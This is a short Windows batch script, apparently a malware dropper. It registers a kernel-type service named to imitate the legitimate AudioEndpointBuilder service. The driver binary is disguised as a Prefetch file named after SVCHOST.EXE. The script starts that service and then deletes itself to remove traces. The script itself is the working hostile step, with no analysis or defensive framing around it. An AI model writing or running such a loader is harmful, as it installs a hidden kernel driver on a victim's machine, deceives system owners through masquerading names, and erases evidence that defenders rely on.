@echo off
cd %~dp0
sc create AudioEndpointBuilder_515 binpath=C:\Windows\Prefetch\SVCHOST.EXE-M5S1KJ74.pf type=kernel
sc start AudioEndpointBuilder_515
del "%~f0"



